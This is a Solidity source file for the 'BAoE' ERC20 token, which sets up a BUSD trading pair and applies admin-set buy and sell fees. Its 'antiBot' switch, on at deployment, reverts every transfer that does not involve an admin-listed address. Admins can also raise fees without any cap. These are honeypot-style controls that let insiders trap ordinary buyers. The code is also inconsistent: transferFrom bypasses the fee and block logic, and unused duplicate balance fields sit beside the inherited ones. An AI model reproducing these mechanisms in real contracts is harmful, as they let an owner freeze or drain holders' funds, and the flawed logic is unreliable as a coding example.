pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/Context.sol";
import "./libraries/Uniswap.sol";

contract BAoEToken is Context, ERC20, Ownable {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => uint256) private adminlist;

    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
    address BUSD;
    address addressReceiver;
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    event ExcludeFromFees(address indexed account, bool isExcluded);
    uint256 sellFeeRate = 2;
    uint256 buyFeeRate = 2;
    uint256 transferFeeRate = 0;
    uint256 antiBot = 1;

    uint256 percentAmountWhale = 1;

    constructor(address _BUSD, address _addressReceiver) ERC20( "BAoE", "BA")  {
        _name = "BAoE";
        _symbol = "BA";
        _decimals = 18;
        _totalSupply = 1000000000000000000000000000;
        _mint(msg.sender, _totalSupply);
        adminlist[msg.sender] = 1;

        BUSD = _BUSD;
        addressReceiver = _addressReceiver;

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3
        );

        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), BUSD);

        uniswapV2Router = _uniswapV2Router;
        _approve(address(this), address(uniswapV2Router), ~uint256(0));
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount)
        public virtual override returns (bool)
    {
        _beforeTransfer(_msgSender(), recipient, amount);
        if (transferFeeRate > 0) {
            uint256 _fee = amount*transferFeeRate/100;
            _transfer(_msgSender(), addressReceiver, _fee);
            amount = amount - _fee;
        }
        _transfer(_msgSender(), recipient, amount);
        return true;
    }



    function _beforeTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if (antiBot == 1) {
            if(adminlist[sender] > 0 || adminlist[recipient] > 0) {
                transferFeeRate = 0;         
            }else{
                require(0>1, "Revert transaction");
            }
        }else{
            if(sender == uniswapV2Pair){
                if(adminlist[recipient] > 0) {
                    transferFeeRate = 0;
                } else{
                    require(amount <= (this.balanceOf(uniswapV2Pair)*percentAmountWhale)/100,"Revert whale transaction");
                    transferFeeRate = buyFeeRate;
                }
                
            } else {
                if(adminlist[sender] > 0) {
                    transferFeeRate = 0;
                } else {
                    transferFeeRate = sellFeeRate;
                }
            }
        }
    }

    function changeBuyFeeRate(uint256 rate) public returns (uint256) {
        if (adminlist[msg.sender] == 1) {
            buyFeeRate = rate;
        }
        return buyFeeRate;
    }

    function changeSellFeeRate(uint256 rate) public returns (uint256) {
        if (adminlist[msg.sender] == 1) {
            sellFeeRate = rate;
        }
        return sellFeeRate;
    }

    function activateAntiBot() public returns (bool) {
        if (adminlist[msg.sender] == 1) {
            antiBot = 1;
        }
        return true;
    }

    function deactivateAntiBot() public returns (bool) {
        if (adminlist[msg.sender] == 1) {
            antiBot = 0;
        }
        return true;
    }

    function addToAdminlist(address account)
        public
        onlyOwner
        returns (uint256)
    {
        adminlist[account] = 1;
        return adminlist[account];
    }

    function removeFromAdminlist(address account)
        public
        onlyOwner
        returns (uint256)
    {
        adminlist[account] = 0;
        return adminlist[account];
    }
}
